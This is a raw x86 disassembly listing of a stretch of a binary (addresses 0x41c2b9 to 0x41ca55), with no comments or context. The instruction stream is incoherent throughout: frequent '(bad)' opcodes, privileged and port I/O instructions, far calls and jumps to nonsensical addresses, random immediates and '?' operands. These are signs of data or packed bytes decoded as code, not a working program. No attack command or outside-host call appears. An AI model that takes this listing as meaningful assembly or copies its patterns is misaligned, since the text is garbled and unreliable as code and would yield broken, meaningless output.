  41c2b9:	mov    WORD PTR [eax+0x1eee9c63],ds
  41c2bf:	or     BYTE PTR [eax+0x79],dl
  41c2c2:	sbb    ecx,ebp
  41c2c4:	and    BYTE PTR [ecx],bh
  41c2c6:	jo     0x41c320
  41c2c8:	ret    0xa0b0
  41c2cb:	(bad)  
  41c2cc:	fdivr  QWORD PTR [ebx]
  41c2ce:	xchg   edx,eax
  41c2cf:	(bad)  
  41c2d0:	scas   al,BYTE PTR es:[edi]
  41c2d1:	lods   al,BYTE PTR ds:[esi]
  41c2d2:	clc    
  41c2d3:	mov    ch,0x21
  41c2d5:	jnp    0x41c27b
  41c2d7:	dec    edx
  41c2d8:	scas   eax,DWORD PTR es:[edi]
  41c2d9:	push   edx
  41c2da:	retf   0xa4b3
  41c2dd:	inc    ecx
  41c2de:	repz cld 
  41c2e0:	lods   al,BYTE PTR ds:[esi]
  41c2e1:	pop    edi
  41c2e2:	and    BYTE PTR [esi+ebx*2+0x2aa544d0],ah
  41c2e9:	arpl   WORD PTR [ebx+0x747b72f8],di
  41c2ef:	addr16 jne 0x41c368
  41c2f2:	mov    DWORD PTR [edx],edi
  41c2f4:	mov    cl,0x79
  41c2f6:	test   BYTE PTR [ecx-0x1d],dl
  41c2f9:	adc    eax,0x64c1c3eb
  41c2fe:	lock and DWORD PTR [edx],ebp
  41c301:	xchg   ebp,eax
  41c302:	mov    dl,0xfa
  41c304:	das    
  41c305:	inc    eax
  41c306:	adc    ch,0x83
  41c309:	fist   WORD PTR [eax]
  41c30b:	lods   al,BYTE PTR ds:[esi]
  41c30c:	cmp    ecx,edx
  41c30e:	adc    al,0x77
  41c310:	add    cl,BYTE PTR [edi+0x3]
  41c313:	push   ebp
  41c314:	mov    bl,0x97
  41c316:	scas   eax,DWORD PTR es:[edi]
  41c317:	addr16 mov al,0x35
  41c31a:	add    al,0x91
  41c31c:	inc    ebp
  41c31d:	push   edx
  41c31e:	mov    dh,BYTE PTR [eax-0x43]
  41c321:	pushf  
  41c322:	adc    DWORD PTR [esp+eiz*2],ecx
  41c325:	jge    0x41c34f
  41c327:	test   eax,0x7aab27d5
  41c32c:	mov    ds:0x47976eb6,eax
  41c331:	push   ebp
  41c332:	xor    DWORD PTR [esi],eax
  41c334:	mov    DWORD PTR [edi],esp
  41c336:	jne    0x41c39b
  41c338:	and    DWORD PTR [edx-0x10],0xf09caf73
  41c33f:	loope  0x41c312
  41c341:	shl    DWORD PTR [ebp+0x68],0x2b
  41c345:	(bad)  
  41c346:	imul   ecx,edx,0xffffffac
  41c349:	push   edx
  41c34a:	mov    esp,0x5c42f60
  41c34f:	lods   al,BYTE PTR ds:[esi]
  41c350:	or     dl,0x30
  41c353:	push   esi
  41c354:	loop   0x41c31b
  41c356:	loopne 0x41c380
  41c358:	imul   esp,DWORD PTR [ebx-0xc],0xe1522cb2
  41c35f:	jge    0x41c33a
  41c361:	jns    0x41c37d
  41c363:	pop    edx
  41c364:	sbb    dl,dl
  41c366:	(bad)  
  41c367:	popf   
  41c368:	add    eax,0xfc047048
  41c36d:	sub    BYTE PTR [edi+0x7df0949a],0xec
  41c374:	pushf  
  41c375:	out    dx,eax
  41c376:	test   al,0xa5
  41c378:	fcom   QWORD PTR [ecx]
  41c37a:	mov    ds:0x316770d9,eax
  41c37f:	mov    ecx,0x1c6f5b8f
  41c384:	sub    ebx,DWORD PTR [ebx+0x51]
  41c387:	or     BYTE PTR [edi],bl
  41c389:	std    
  41c38a:	fiadd  WORD PTR [ebp+0x1f]
  41c38d:	pop    ebp
  41c38e:	aad    0x24
  41c390:	dec    edx
  41c391:	retf   
  41c392:	push   esp
  41c393:	mov    esi,0x34f4a9b8
  41c398:	(bad)  
  41c399:	adc    eax,0xd9542467
  41c39e:	gs repz cmp eax,0x7e0f0d63
  41c3a5:	jmp    0xf91dc31e
  41c3aa:	xchg   esi,eax
  41c3ab:	pop    esp
  41c3ac:	cmc    
  41c3ad:	push   ds
  41c3ae:	sbb    eax,0x8851356c
  41c3b3:	sub    eax,0x95659270
  41c3b8:	pop    edi
  41c3b9:	mov    bl,0x18
  41c3bb:	adc    al,0xb0
  41c3bd:	(bad)  
  41c3be:	fwait
  41c3bf:	inc    ebp
  41c3c0:	lock retf 0x21af
  41c3c4:	retf   
  41c3c5:	cmp    edx,DWORD PTR [ecx]
  41c3c7:	pop    edx
  41c3c8:	fsubr  DWORD PTR [ebp+0x23c1c52d]
  41c3ce:	and    ah,BYTE PTR [ecx-0x10676eea]
  41c3d4:	xchg   edi,ebp
  41c3d6:	cmp    DWORD PTR [edi+0x302d9a1a],edi
  41c3dc:	sub    eax,0x52287dc5
  41c3e1:	imul   eax,eax,0x4
  41c3e4:	test   DWORD PTR [ebx+edx*1-0x2],eax
  41c3e8:	adc    eax,0x94d5aed7
  41c3ed:	addr16 int3 
  41c3ef:	ret    
  41c3f0:	ret    0xe637
  41c3f3:	push   eax
  41c3f4:	fsubr  QWORD PTR [edi]
  41c3f6:	ins    BYTE PTR es:[edi],dx
  41c3f7:	sub    ebp,edi
  41c3f9:	push   edi
  41c3fa:	cwde   
  41c3fb:	push   ebp
  41c3fc:	inc    edi
  41c3fd:	int    0x53
  41c3ff:	ror    BYTE PTR [ebx+0x211384c1],1
  41c405:	mov    cl,0x27
  41c407:	out    0x91,al
  41c409:	cmp    eax,0xac02b148
  41c40e:	addr16 daa 
  41c410:	call   0xac83:0xabddbb01
  41c417:	inc    ecx
  41c418:	dec    esp
  41c419:	cmp    edi,0x461f0d5
  41c41f:	enter  0xaf46,0xb4
  41c423:	cmp    dl,BYTE PTR [ecx+0x77]
  41c426:	outs   dx,BYTE PTR ds:[esi]
  41c427:	je     0x41c3ac
  41c429:	add    DWORD PTR [eax+0x6354a7f],esi
  41c42f:	dec    dx
  41c431:	push   ecx
  41c432:	mov    WORD PTR [edx+0x10],?
  41c435:	lock inc ebp
  41c437:	mov    ch,0xb5
  41c439:	inc    esi
  41c43a:	dec    ebp
  41c43b:	mov    ds:0xc2e5e393,eax
  41c440:	ins    BYTE PTR es:[edi],dx
  41c441:	bound  esi,QWORD PTR [ecx]
  41c443:	adc    al,BYTE PTR [ecx-0x46]
  41c446:	push   es
  41c447:	mov    dh,0xe5
  41c449:	or     DWORD PTR [eax+eiz*4-0x31],eax
  41c44d:	repnz outs dx,BYTE PTR ds:[esi]
  41c44f:	(bad)  
  41c450:	xchg   ebx,eax
  41c451:	int    0x6e
  41c453:	xchg   al,ch
  41c455:	add    ebp,edx
  41c457:	push   ebp
  41c458:	or     al,0xa0
  41c45a:	pop    ebx
  41c45b:	loope  0x41c4d5
  41c45d:	bound  edx,QWORD PTR [esi-0x770f0c83]
  41c463:	jae    0x41c4ab
  41c465:	xor    al,0x62
  41c467:	(bad)  [ecx+ebx*1+0x38fb6c69]
  41c46e:	mov    dh,0x72
  41c470:	lahf   
  41c471:	int3   
  41c472:	ja     0x41c444
  41c474:	mov    DWORD PTR [esi+0xc1c1c7e],ebp
  41c47a:	mov    ebx,0xc2a8bf51
  41c47f:	arpl   WORD PTR [esi-0x18adc12d],di
  41c485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c486:	stos   DWORD PTR es:[edi],eax
  41c487:	sub    BYTE PTR [esi],bl
  41c489:	imul   ebp,DWORD PTR [esi-0x15],0x624d393
  41c490:	xchg   ebx,eax
  41c491:	xchg   ebp,eax
  41c492:	sub    BYTE PTR [ecx],0x66
  41c495:	push   edi
  41c496:	jmp    0x219b1d95
  41c49b:	call   0xa863:0x777bc9fa
  41c4a2:	add    ebx,DWORD PTR [ebx+0x49786767]
  41c4a8:	dec    edi
  41c4a9:	scas   al,BYTE PTR es:[edi]
  41c4aa:	and    DWORD PTR [edi+esi*4],eax
  41c4ad:	mov    eax,ds:0x4455717c
  41c4b2:	js     0x41c4a2
  41c4b4:	div    BYTE PTR [edi+0x4d]
  41c4b7:	cmp    eax,0x9571330a
  41c4bc:	xor    ebx,DWORD PTR [edi+0x60]
  41c4bf:	push   eax
  41c4c0:	pop    eax
  41c4c1:	aam    0x81
  41c4c3:	sbb    BYTE PTR [esi-0x5c],ah
  41c4c6:	imul   eax,DWORD PTR [edx-0xf4d03db],0x2c5290de
  41c4d0:	mov    eax,ds:0xe87d8563
  41c4d5:	jbe    0x41c4be
  41c4d7:	data16 sub bl,BYTE PTR [ebx-0x5805c5ca]
  41c4de:	sub    cl,bh
  41c4e0:	xchg   edx,eax
  41c4e1:	xchg   DWORD PTR [eax+0x39],edi
  41c4e4:	jp     0x41c55f
  41c4e6:	xchg   ebx,eax
  41c4e7:	pop    esi
  41c4e8:	inc    esi
  41c4e9:	xchg   cl,dh
  41c4eb:	push   0x5b
  41c4ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ee:	sub    cl,dl
  41c4f0:	pushf  
  41c4f1:	je     0x41c51a
  41c4f3:	fwait
  41c4f4:	cmp    al,ah
  41c4f6:	xor    ah,cl
  41c4f8:	jnp    0x41c4ed
  41c4fa:	jno    0x41c53a
  41c4fc:	outs   dx,DWORD PTR ds:[esi]
  41c4fd:	push   ss
  41c4fe:	sbb    al,0x22
  41c500:	xchg   ecx,eax
  41c501:	and    DWORD PTR [ecx-0x2b],esi
  41c504:	adc    DWORD PTR [edi+0x71986b9f],ebp
  41c50a:	aas    
  41c50b:	lods   eax,DWORD PTR ds:[esi]
  41c50c:	mov    bh,0x8a
  41c50e:	xchg   ebx,eax
  41c50f:	scas   al,BYTE PTR es:[edi]
  41c510:	imul   ebx,DWORD PTR [ebp-0x50],0xc83af862
  41c517:	lea    ebp,[eax+0x61]
  41c51a:	sbb    al,0x91
  41c51c:	std    
  41c51d:	sub    BYTE PTR [ebx],0x81
  41c520:	mov    ebp,0xfe08d320
  41c525:	lahf   
  41c526:	sti    
  41c527:	loope  0x41c4fa
  41c529:	int    0xdd
  41c52b:	xor    esi,edx
  41c52d:	rcr    BYTE PTR [ebx+0x7a],1
  41c530:	or     DWORD PTR ds:0x331a3019,edx
  41c536:	mov    eax,ds:0x294e269a
  41c53b:	(bad)  
  41c53c:	sbb    BYTE PTR [esi+0x46],dl
  41c53f:	mov    edx,0xc04b659c
  41c544:	mov    cs,edi
  41c546:	inc    eax
  41c547:	dec    eax
  41c548:	(bad)  
  41c549:	mov    dl,0x50
  41c54b:	cld    
  41c54c:	mov    eax,0x766e14a9
  41c551:	and    al,0x2d
  41c553:	fisub  DWORD PTR [ecx]
  41c555:	retf   0x859c
  41c558:	loop   0x41c580
  41c55a:	stos   BYTE PTR es:[edi],al
  41c55b:	(bad)  
  41c55d:	test   al,0x49
  41c55f:	xchg   esi,eax
  41c560:	aas    
  41c561:	dec    edx
  41c562:	xor    al,bl
  41c564:	loop   0x41c504
  41c566:	sbb    eax,0x62ddb4c8
  41c56b:	ror    DWORD PTR [edi+0x19e8e278],0xdb
  41c572:	or     BYTE PTR [edi+0x62b35a14],dl
  41c578:	nop
  41c579:	xor    edi,DWORD PTR [ebx-0x65]
  41c57c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c57d:	fcmovnu st,st(4)
  41c57f:	int3   
  41c580:	pop    esp
  41c581:	repz pushf 
  41c583:	adc    DWORD PTR [edx-0x4e],eax
  41c586:	mov    esi,0xc1c7a3b2
  41c58b:	mov    edx,0xb7deb955
  41c590:	je     0x41c526
  41c592:	fisttp WORD PTR [eax+0x63]
  41c595:	repz cmp al,0x18
  41c598:	arpl   WORD PTR ds:0x9a084c51,dx
  41c59e:	jg     0x41c53e
  41c5a0:	(bad)  
  41c5a1:	and    edi,ebx
  41c5a3:	sbb    DWORD PTR [ebx+0xe05ba69],esp
  41c5a9:	inc    edx
  41c5aa:	neg    BYTE PTR [edx+edi*4]
  41c5ad:	push   edi
  41c5ae:	xchg   BYTE PTR [ebx+edx*2],dh
  41c5b1:	mov    ebp,0x6539e4bf
  41c5b6:	call   0xdcc05316
  41c5bb:	pop    esi
  41c5bc:	rcl    BYTE PTR [ebx-0x3dfa5797],0x0
  41c5c3:	xchg   esp,ebx
  41c5c5:	inc    ecx
  41c5c6:	dec    esp
  41c5c7:	cmp    DWORD PTR [esi-0x4a76768e],edi
  41c5cd:	mov    esp,0xe90309b7
  41c5d2:	or     BYTE PTR [ebx],dh
  41c5d4:	dec    ebp
  41c5d5:	popa   
  41c5d6:	(bad)  
  41c5d7:	fadd   st(1),st
  41c5d9:	lods   eax,DWORD PTR ds:[esi]
  41c5da:	push   ecx
  41c5db:	dec    ebp
  41c5dc:	mov    ah,0x52
  41c5de:	sbb    DWORD PTR [eax-0x3e50cc19],0xffffffb1
  41c5e5:	and    DWORD PTR [ebx],eax
  41c5e7:	sbb    eax,0xcf9956be
  41c5ec:	mov    eax,ds:0xbceab9c5
  41c5f1:	iret   
  41c5f2:	loope  0x41c5ae
  41c5f4:	js     0x41c663
  41c5f6:	add    DWORD PTR [esi],edx
  41c5f8:	mov    ah,0xd2
  41c5fa:	rol    edx,cl
  41c5fc:	dec    esp
  41c5fd:	repnz dec esp
  41c5ff:	cli    
  41c600:	das    
  41c601:	data16 and al,0xdc
  41c604:	neg    BYTE PTR [ecx+0x352de8e5]
  41c60a:	repnz loope 0x41c64b
  41c60d:	cmc    
  41c60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c60f:	push   esp
  41c610:	inc    ebx
  41c611:	inc    eax
  41c612:	call   FWORD PTR [ebx+0x5292d399]
  41c618:	push   edi
  41c619:	push   eax
  41c61a:	lea    esp,[ecx+edx*4]
  41c61d:	or     al,0xc8
  41c61f:	mov    ah,0x92
  41c621:	call   0xb383:0x19f8b154
  41c628:	ins    DWORD PTR es:[edi],dx
  41c629:	cmp    al,0xd
  41c62b:	fs mov ah,0x23
  41c62e:	mov    esp,0x68cd038e
  41c633:	ins    BYTE PTR es:[edi],dx
  41c634:	inc    esp
  41c635:	mov    BYTE PTR [ebp+0x79],dh
  41c638:	lock inc ebp
  41c63a:	test   DWORD PTR [ebp+0x635f96b4],ebx
  41c640:	fist   WORD PTR [eax]
  41c642:	mov    ebx,0xbf9fd6d7
  41c647:	lea    ebp,[eax-0x27]
  41c64a:	retf   
  41c64b:	in     eax,dx
  41c64c:	xchg   edi,ebx
  41c64e:	test   al,0x14
  41c650:	sub    eax,0x652db35f
  41c655:	xchg   edi,eax
  41c656:	pop    edi
  41c657:	sub    esi,ecx
  41c659:	mov    edi,0x22b3c369
  41c65e:	hlt    
  41c65f:	mov    edi,0x95336636
  41c664:	pop    ss
  41c665:	mov    ebp,0xfd2ed326
  41c66a:	loopne 0x41c6bc
  41c66c:	cmp    edx,DWORD PTR [ecx]
  41c66e:	out    dx,al
  41c66f:	mov    es,WORD PTR [ecx-0x13]
  41c672:	add    al,bh
  41c674:	retf   0x2ea
  41c677:	pop    ss
  41c678:	ins    DWORD PTR es:[edi],dx
  41c679:	and    dh,BYTE PTR [ecx]
  41c67b:	xchg   DWORD PTR [ebx-0x29],edi
  41c67e:	pop    ecx
  41c67f:	popa   
  41c680:	shr    BYTE PTR [ebp-0x508ad086],0x54
  41c687:	mov    WORD PTR [esi+ebp*4],ss
  41c68a:	test   al,0x78
  41c68c:	xchg   ebp,eax
  41c68d:	xor    al,0x91
  41c690:	or     eax,0xd4a521c8
  41c695:	fidiv  DWORD PTR [esi]
  41c697:	sti    
  41c698:	xor    DWORD PTR cs:[edx-0xc4e4c2e],esp
  41c69f:	(bad)  
  41c6a0:	mov    ds:0xa861545a,al
  41c6a5:	jle    0x41c64f
  41c6a7:	sub    BYTE PTR [edx+0x79e34911],al
  41c6ad:	sbb    ch,BYTE PTR [edx-0x71]
  41c6b0:	sub    al,0x5b
  41c6b2:	push   edx
  41c6b3:	cs gs das 
  41c6b6:	repz inc edx
  41c6b8:	sbb    al,0x14
  41c6ba:	lds    eax,FWORD PTR [esi]
  41c6bc:	fs (bad) 
  41c6be:	sar    BYTE PTR [ecx-0x40538b72],1
  41c6c4:	sub    ebx,ecx
  41c6c6:	mov    ds:0xee7bdeb2,eax
  41c6cb:	inc    edi
  41c6cc:	sub    DWORD PTR [ecx],edi
  41c6ce:	fisttp WORD PTR ds:0xa55447eb
  41c6d4:	out    0xc5,eax
  41c6d6:	mov    dh,0xd5
  41c6d8:	lds    esp,FWORD PTR [ecx-0x3e0c19a9]
  41c6de:	sub    al,0x67
  41c6e0:	stc    
  41c6e1:	or     BYTE PTR [eax],bl
  41c6e3:	div    DWORD PTR [ebx]
  41c6e5:	dec    eax
  41c6e6:	icebp  
  41c6e7:	rol    DWORD PTR [ebx-0x12],0x26
  41c6eb:	or     esp,DWORD PTR [eax]
  41c6ed:	mov    BYTE PTR [edx+0x55a54a9e],al
  41c6f3:	fwait
  41c6f4:	inc    ebp
  41c6f5:	das    
  41c6f6:	int3   
  41c6f7:	xorps  xmm6,XMMWORD PTR [eax-0x77]
  41c6fb:	pop    ebp
  41c6fc:	(bad)  
  41c6fd:	mov    ebp,DWORD PTR [edi-0x155e9aa4]
  41c703:	test   edx,esp
  41c705:	add    dh,BYTE PTR gs:[edi]
  41c708:	xlat   BYTE PTR ds:[ebx]
  41c709:	sub    al,0x44
  41c70b:	leave  
  41c70c:	fisttp DWORD PTR [eax-0x38]
  41c70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c710:	call   0xb5f5b73f
  41c715:	push   0xb88a0a11
  41c71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c71b:	pop    ss
  41c71c:	and    eax,ebx
  41c71e:	or     DWORD PTR [ebp+0x1a],ecx
  41c721:	in     eax,dx
  41c722:	in     eax,0xf5
  41c724:	(bad)
  41c728:	mov    DWORD PTR [esi-0x35961bc1],esp
  41c72e:	std    
  41c72f:	ins    BYTE PTR es:[edi],dx
  41c730:	pop    edi
  41c731:	and    esi,esp
  41c733:	mov    BYTE PTR [eax-0x14],cl
  41c736:	clc    
  41c737:	nop
  41c738:	cmc    
  41c739:	and    edi,0xffffff9f
  41c73c:	mov    al,0x19
  41c73e:	dec    edi
  41c73f:	scas   al,BYTE PTR es:[edi]
  41c740:	cmc    
  41c741:	sti    
  41c742:	mov    ds:0x67be933e,al
  41c747:	into   
  41c748:	cmp    esi,DWORD PTR [ebx+0x1f62631a]
  41c74e:	sbb    al,0xb2
  41c750:	jb     0x41c761
  41c752:	(bad)  
  41c753:	mov    esp,0x40724b1
  41c758:	jl     0x41c738
  41c75a:	lods   eax,DWORD PTR ds:[esi]
  41c75b:	lods   al,BYTE PTR ds:[esi]
  41c75c:	push   eax
  41c75d:	test   eax,0xc465a269
  41c762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c763:	or     BYTE PTR [ebx+esi*4],dl
  41c766:	xlat   BYTE PTR ds:[ebx]
  41c767:	xor    DWORD PTR [esi+0x7d9d72e4],0x55
  41c76e:	add    eax,0x36bd3b34
  41c773:	push   ebp
  41c774:	outs   dx,DWORD PTR ds:[esi]
  41c775:	inc    eax
  41c776:	or     eax,0xb23bb752
  41c77b:	lods   al,BYTE PTR ds:[esi]
  41c77c:	rol    BYTE PTR [edi],cl
  41c77e:	shr    BYTE PTR [edx-0x8],1
  41c781:	in     al,dx
  41c782:	cdq    
  41c783:	xor    DWORD PTR [edx+0x5012490],esp
  41c789:	jo     0x41c710
  41c78b:	loopne 0x41c737
  41c78d:	pop    edx
  41c78e:	jmp    0x41c785
  41c790:	bound  esi,QWORD PTR [edx-0x62af15c8]
  41c796:	jb     0x41c741
  41c798:	mov    ecx,0xa6254c42
  41c79d:	mov    al,ds:0x62a2a214
  41c7a2:	mov    eax,ds:0x9f0083b0
  41c7a7:	add    ch,BYTE PTR [ecx+0x30891795]
  41c7ad:	ins    DWORD PTR es:[edi],dx
  41c7ae:	dec    BYTE PTR [ebx]
  41c7b0:	fs call 0xbe270b2d
  41c7b6:	push   ss
  41c7b7:	aad    0xe4
  41c7b9:	dec    esi
  41c7ba:	jmp    0x1e28:0xc7d032ae
  41c7c1:	fld    TBYTE PTR ds:0xdd706ec9
  41c7c7:	mov    ds:0xc2f6fc19,al
  41c7cc:	xor    al,0x24
  41c7ce:	push   esi
  41c7cf:	pop    ecx
  41c7d0:	aad    0x35
  41c7d2:	ds sbb al,0x87
  41c7d5:	shl    BYTE PTR [esi],cl
  41c7d7:	jmp    0x3c4f84bd
  41c7dc:	daa    
  41c7dd:	adc    BYTE PTR [edx+0x2e5228fa],cl
  41c7e3:	mov    bh,0xfa
  41c7e5:	aam    0xec
  41c7e7:	or     DWORD PTR [eax],ebx
  41c7e9:	js     0x41c82a
  41c7eb:	dec    ebp
  41c7ec:	test   DWORD PTR [ecx+0xb],eax
  41c7ef:	ds push ebp
  41c7f1:	pop    ebp
  41c7f2:	add    edi,DWORD PTR [edi+0x64ef8e3b]
  41c7f8:	sbb    DWORD PTR [ecx+0x12122fc3],esp
  41c7fe:	int    0xd1
  41c800:	xor    eax,0x2d19953d
  41c805:	pusha  
  41c806:	jp     0x41c7e8
  41c808:	cmc    
  41c809:	sub    DWORD PTR [ebp+0x6ab5276c],esp
  41c80f:	mov    esi,0x3fe53cbc
  41c814:	sbb    esp,esp
  41c816:	mov    eax,ds:0xb72f58e2
  41c81b:	not    DWORD PTR [ebx+0x5dc631c7]
  41c821:	jge    0x41c832
  41c823:	xchg   ecx,eax
  41c824:	inc    esi
  41c825:	dec    ebp
  41c826:	and    DWORD PTR [edi],ebp
  41c828:	cmp    DWORD PTR [edi+0x7fa10aee],esi
  41c82e:	mov    eax,ds:0x99a5248c
  41c833:	inc    edx
  41c834:	mov    ebp,0x1283c14c
  41c839:	add    ah,bl
  41c83b:	std    
  41c83c:	shr    bl,0xa3
  41c83f:	pop    ss
  41c840:	in     al,dx
  41c841:	jp     0x41c7c3
  41c843:	rcl    BYTE PTR [ecx+0xc018634],0x12
  41c84a:	cmp    al,0x9c
  41c84c:	loopne 0x41c815
  41c84e:	sub    al,BYTE PTR [ecx]
  41c850:	push   0x73cc210f
  41c855:	push   ds
  41c856:	stos   DWORD PTR es:[edi],eax
  41c857:	inc    ebp
  41c858:	loope  0x41c898
  41c85a:	inc    edi
  41c85b:	xor    DWORD PTR [eax-0x4f73df34],0xeb774034
  41c865:	cmp    DWORD PTR [ecx],edx
  41c867:	test   DWORD PTR [ecx],eax
  41c869:	rcr    DWORD PTR [edx],1
  41c86b:	cmp    eax,0x4066d5c0
  41c870:	scas   al,BYTE PTR es:[edi]
  41c871:	mov    bh,0x25
  41c873:	popf   
  41c874:	cmp    ch,BYTE PTR [ecx]
  41c876:	and    BYTE PTR [ebx+edx*8+0x4a21dcde],ch
  41c87d:	inc    ebx
  41c87e:	repnz into 
  41c880:	ficom  DWORD PTR [esi]
  41c882:	mov    dh,0xe9
  41c884:	data16 add dl,bl
  41c887:	sub    DWORD PTR [eax-0x442c1b0a],0xffffff92
  41c88e:	inc    edx
  41c88f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c890:	cmp    eax,0xb0bdbfa8
  41c895:	je     0x94efb0c9
  41c89b:	mov    dl,0xfa
  41c89d:	or     BYTE PTR [ebp+0x4e],cl
  41c8a0:	pop    ebx
  41c8a1:	sbb    DWORD PTR [esp+ecx*4-0x75],ebx
  41c8a5:	cli    
  41c8a6:	shr    ebx,0x38
  41c8a9:	jl     0x41c8ab
  41c8ab:	and    DWORD PTR [ebx-0x24],0xab106336
  41c8b2:	aas    
  41c8b3:	push   esp
  41c8b4:	sub    al,0x80
  41c8b6:	repz sbb eax,0x9a8f9be6
  41c8bc:	jns    0x41c91b
  41c8be:	lods   eax,DWORD PTR ds:[esi]
  41c8bf:	inc    edi
  41c8c0:	xchg   ebp,eax
  41c8c1:	addr16 cmc 
  41c8c3:	xchg   ecx,eax
  41c8c4:	push   eax
  41c8c5:	adc    ah,BYTE PTR [eax-0x73]
  41c8c8:	mov    dl,0xe2
  41c8ca:	(bad)  
  41c8cc:	bound  edx,QWORD PTR [esi]
  41c8ce:	jo     0x41c88a
  41c8d0:	sub    dh,ah
  41c8d2:	mov    edx,DWORD PTR [esi+0x28d62502]
  41c8d8:	repz test DWORD PTR [ebp+0x564a09aa],esp
  41c8df:	fbstp  TBYTE PTR [ebp+0x1d]
  41c8e2:	pop    ss
  41c8e3:	jmp    0x24692591
  41c8e8:	dec    esi
  41c8e9:	mov    bl,BYTE PTR [ecx+0x204c98a3]
  41c8ef:	addr16 dec esi
  41c8f1:	push   edx
  41c8f2:	jmp    0x1636eca1
  41c8f7:	push   ecx
  41c8f8:	add    eax,0xc1264c26
  41c8fd:	mov    ah,0x34
  41c8ff:	sahf   
  41c900:	dec    esp
  41c901:	and    eax,0x4834f909
  41c906:	lds    ebp,FWORD PTR [edx+0x52]
  41c909:	inc    edx
  41c90a:	push   0xffffff9f
  41c90c:	lods   eax,DWORD PTR ds:[esi]
  41c90d:	in     al,dx
  41c90e:	and    esp,DWORD PTR [edi-0x79fc12d3]
  41c914:	dec    ebp
  41c915:	frstor ds:0x6a1adcbb
  41c91b:	mov    bh,0xa6
  41c91d:	jmp    0x1ce609c3
  41c922:	fs jno 0x41c8b4
  41c925:	inc    esp
  41c926:	hlt    
  41c927:	bound  eax,QWORD PTR [edx-0x7859fd9c]
  41c92d:	xchg   edi,eax
  41c92e:	sub    ch,bl
  41c930:	pusha  
  41c931:	and    ch,dh
  41c933:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c934:	or     BYTE PTR [ebx+0x7c],0x65
  41c938:	and    ah,dl
  41c93a:	jne    0x41c9ac
  41c93c:	mov    eax,0xe8cb541a
  41c941:	mov    al,ds:0xb46e5fa5
  41c946:	loop   0x41c9ac
  41c948:	or     ch,BYTE PTR [edx-0x744cf818]
  41c94e:	sbb    bl,dh
  41c950:	lds    ecx,FWORD PTR [esi]
  41c952:	sbb    dl,bl
  41c954:	rcl    DWORD PTR [edx],1
  41c956:	mov    eax,ds:0xdd26628a
  41c95b:	mov    ?,ebp
  41c95d:	jp     0x41c92a
  41c95f:	dec    esi
  41c960:	int    0x82
  41c962:	stos   BYTE PTR es:[edi],al
  41c963:	jne    0x41c97b
  41c965:	(bad)  
  41c966:	in     al,0x9e
  41c968:	xchg   BYTE PTR [ebx-0x2de49bc9],dh
  41c96e:	xchg   esp,eax
  41c96f:	fist   DWORD PTR [esi-0x53]
  41c972:	mov    ebp,0x2358c9f5
  41c977:	add    DWORD PTR [edi+0x5caf9180],0xd2ab1586
  41c981:	jp     0x41c9e6
  41c983:	or     BYTE PTR [eax],bl
  41c985:	fmul   QWORD PTR [esi-0x3a]
  41c988:	jg     0x41c929
  41c98a:	shr    DWORD PTR [ebx],1
  41c98c:	fisubr DWORD PTR [edi+0x40b77c37]
  41c992:	stos   DWORD PTR es:[edi],eax
  41c993:	(bad)  
  41c995:	sbb    bh,BYTE PTR [esi+0x6ebaa09f]
  41c99b:	or     BYTE PTR [esi],al
  41c99d:	mov    dh,0x46
  41c99f:	dec    ebp
  41c9a0:	push   cs
  41c9a1:	lds    edi,FWORD PTR [edx]
  41c9a3:	pop    ebx
  41c9a4:	push   ss
  41c9a5:	aas    
  41c9a6:	jbe    0x41c9ed
  41c9a8:	sub    esp,ecx
  41c9aa:	lahf   
  41c9ab:	lods   al,BYTE PTR ds:[esi]
  41c9ac:	fistp  WORD PTR [eax]
  41c9ae:	mov    ds:0x295a3321,eax
  41c9b3:	ins    DWORD PTR es:[edi],dx
  41c9b4:	es dec edx
  41c9b6:	inc    edx
  41c9b7:	(bad)  
  41c9b8:	cmp    edi,DWORD PTR [esi-0x3f704530]
  41c9be:	mov    esi,0x1d36cd4e
  41c9c3:	iret   
  41c9c4:	stc    
  41c9c5:	xor    eax,edx
  41c9c7:	cmp    DWORD PTR [eax-0x10a4667a],0xda032961
  41c9d1:	push   edi
  41c9d2:	mov    ch,0xbb
  41c9d4:	mov    edx,0xcc5e8391
  41c9d9:	jo     0x41c97d
  41c9db:	adc    eax,0x94acd1de
  41c9e0:	sbb    esp,edx
  41c9e2:	out    0x40,eax
  41c9e4:	(bad)  
  41c9e5:	and    esi,DWORD PTR [ebx-0x7f]
  41c9e8:	fld    TBYTE PTR [edx-0x771199f4]
  41c9ee:	mov    cl,0x53
  41c9f0:	aaa    
  41c9f1:	(bad)  
  41c9f2:	pop    ebx
  41c9f3:	sbb    ecx,ebx
  41c9f5:	ret    0x8e85
  41c9f8:	test   eax,0xaf24c962
  41c9fd:	mov    esp,0x72ee825b
  41ca02:	dec    ebx
  41ca03:	ins    DWORD PTR es:[edi],dx
  41ca04:	push   esi
  41ca05:	adc    DWORD PTR [eax-0x3d],ebp
  41ca08:	retf   
  41ca09:	sub    eax,0xeae1414f
  41ca0e:	out    dx,eax
  41ca0f:	and    BYTE PTR [eax-0x50],dh
  41ca12:	mov    DWORD PTR [edx-0x16250b8e],edx
  41ca18:	sub    eax,0x30b0a482
  41ca1d:	mov    bh,0x16
  41ca1f:	test   eax,0x38262c61
  41ca24:	call   0x2024:0xefef8468
  41ca2b:	je     0x41c9fc
  41ca2d:	jg     0x41ca46
  41ca2f:	mov    ebx,0xddf6eb81
  41ca34:	mov    bh,0x2b
  41ca36:	mov    ds:0x76421a3e,eax
  41ca3b:	hlt    
  41ca3c:	pop    ebp
  41ca3d:	push   esp
  41ca3e:	mov    ecx,?
  41ca40:	pop    ebp
  41ca41:	add    DWORD PTR [ecx-0x1e7bc83b],edi
  41ca47:	xor    bl,BYTE PTR [edx-0x4a]
  41ca4a:	(bad)  
  41ca4b:	lock je 0x41ca40
  41ca4e:	outs   dx,DWORD PTR ds:[esi]
  41ca4f:	repz dec edi
  41ca51:	in     eax,0xc4
  41ca53:	and    esi,eax
  41ca55:	jae    0x41ca3e
